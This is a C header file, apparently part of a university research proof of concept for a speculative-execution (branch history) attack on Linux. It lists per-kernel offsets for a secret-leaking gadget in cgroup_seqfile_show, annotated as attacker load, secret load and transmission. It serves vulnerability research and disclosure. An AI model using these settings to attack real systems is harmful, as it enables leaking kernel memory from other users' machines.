/*
 * Tuesday, May 16th 2023
 *
 * Sander Wiebing - s.j.wiebing@student.vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#ifndef _TARGETS_H_
#define _TARGETS_H_

#define MAX_HISTORY_SIZE 420
#define THR 60

#define VICTIM_SYSCALL 438

// ----------------------------------------------------------------------------
// Micro-architectural dependent settings

#if defined(INTEL_10_GEN)

    #define COLLISION_TRIES 250 // 10th gen tag entropy: 14

#elif defined(INTEL_13_GEN)

    #define COLLISION_TRIES 500
#else
     #error "Not supported micro-architecture"
     // suppress errors
     #define COLLISION_TRIES 0
#endif



// ----------------------------------------------------------------------------
// Kernel version + config dependent settings

#if defined(LINUX_v6_6_RC4_UBUNTU)

    //    endbr64
    //    nop    DWORD PTR [rax+rax*1+0x0]
    //    push   rbp
    //    mov    r8,rsi
    //    mov    rbp,rsp
    //    push   r12
    //    mov    rax,QWORD PTR [rdi+0x70]
    //    mov    r12,rdi
    //    mov    rax,QWORD PTR [rax]
    //    mov    rsi,QWORD PTR [rax+0x60]
    //    mov    rdx,QWORD PTR [rax+0x8]
    //    mov    rax,QWORD PTR [rsi+0x58]
    //    mov    rdi,QWORD PTR [rdx+0x60]
    //    test   rax,rax
    //    je     0xffffffff96dd87f0
    //    movsxd rax,DWORD PTR [rax+0x9c]
    //    add    rax,0x44
    //    mov    rdi,QWORD PTR [rdi+rax*8]


    #define TB_OFFSET (0x44 * 8)
    #define TS_OFFSET 0x9c
    #define STRIDE          8

#elif defined(LINUX_v6_6_RC4_DEFAULT)

//    0xffffffff85b4ff30:  endbr64
//    0xffffffff85b4ff34:  push   rbp
//    0xffffffff85b4ff35:  mov    rax,QWORD PTR [rdi+0x70]
//    0xffffffff85b4ff39:  mov    r8,rsi
//    0xffffffff85b4ff3c:  mov    rbp,rdi
//    0xffffffff85b4ff3f:  mov    rax,QWORD PTR [rax]
//    0xffffffff85b4ff42:  mov    rsi,QWORD PTR [rax+0x60]
//    0xffffffff85b4ff46:  mov    rdx,QWORD PTR [rax+0x8]
//    0xffffffff85b4ff4a:  mov    rax,QWORD PTR [rsi+0x58]
//    0xffffffff85b4ff4e:  mov    rdi,QWORD PTR [rdx+0x60]
//    0xffffffff85b4ff52:  test   rax,rax
//    0xffffffff85b4ff55:  je     0xffffffff85b4ff67
//    0xffffffff85b4ff57:  movsxd rax,DWORD PTR [rax+0x9c]
//    0xffffffff85b4ff5e:  add    rax,0x2e
//    0xffffffff85b4ff62:  mov    rdi,QWORD PTR [rdi+rax*8+0x8]
//    0xffffffff85b4ff67:  mov    rax,QWORD PTR [rsi+0x98]

    #define TB_OFFSET (0x8 + (0x2e * 8))
    #define TS_OFFSET 0x9c
    #define STRIDE          8


#elif defined(LINUX_v6_1_19_DEFAULT)

    //  mov    rax,QWORD PTR [rdi+0x70]     ;LOAD ATTACKER RDI
    //  mov    r8,rsi
    //  mov    rbp,rdi
    //  mov    rax,QWORD PTR [rax]
    //  mov    rsi,QWORD PTR [rax+0x60]
    //  mov    rdx,QWORD PTR [rax+0x8]
    //  mov    rax,QWORD PTR [rsi+0x58]
    //  mov    rdi,QWORD PTR [rdx+0x60]
    //  test   rax,rax
    //  je     0xffffffff81119083 <cgroup_seqfile_show+51>
    //  movsxd rax,DWORD PTR [rax+0x94]     ;LOAD OF SECRET
    //  add    rax,0x2e
    //  rdi,QWORD PTR [rdi+rax*8+0x8]       ;TRANSMISSION

    #define TB_OFFSET (0x8 + (0x2e * 8))
    #define TS_OFFSET 0x94
    #define STRIDE          8


#elif defined(LINUX_v6_1_19_UBUNTU)

    //    mov    rax,QWORD PTR [rdi+0x70]       ;LOAD ATTACKER RDI
    //    mov    rax,QWORD PTR [rax]
    //    mov    r13,QWORD PTR [rax+0x60]
    //    mov    rax,QWORD PTR [rax+0x8]
    //    mov    r15,QWORD PTR [rax+0x60]
    //    mov    rax,QWORD PTR [r13+0x58]
    //    mov    rdi,r15
    //    test   rax,rax
    //    je     0xffffffff811c2a90 <cgroup_seqfile_show+80>
    //    movsxd rbx,DWORD PTR [rax+0x94]       ;LOAD OF SECRET
    //    cmp    rbx,0xe
    //    ja     0xffffffff811c2b40 <cgroup_seqfile_show+256>
    //    add    rbx,0x44
    //    mov    rdi,QWORD PTR [r15+rbx*8]      ;TRANSMISSION

    #define TB_OFFSET (0x44 * 8)
    #define TS_OFFSET 0x94
    #define STRIDE          8

#elif defined(LINUX_v5_15_70_UBUNTU) || defined(LINUX_v5_15_58_UBUNTU)

    // mov    rax,QWORD PTR [rdi+0x70]
    // mov    rax,QWORD PTR [rax]
    // mov    r13,QWORD PTR [rax+0x60]
    // mov    rax,QWORD PTR [rax+0x8]
    // mov    r15,QWORD PTR [rax+0x60]
    // mov    rax,QWORD PTR [r13+0x58]
    // mov    rdi,r15
    // test   rax,rax
    // je     0xffffffff811a2ea1
    // movsxd rbx,DWORD PTR [rax+0x94]
    // cmp    rbx,0xe
    // ja     0xffffffff811a2f3f
    // add    rbx,0x2e
    // mov    rdi,QWORD PTR [r15+rbx*8+0x8]
    #define TB_OFFSET ((0x2e * 8) + 0x8)
    #define TS_OFFSET 0x94
    #define STRIDE          8

#else
    #error "Not supported kernel version"
    // suppress errors
    #define TB_OFFSET 0
    #define TS_OFFSET 0
    #define STRIDE          0

#endif

#endif //_TARGETS_H_
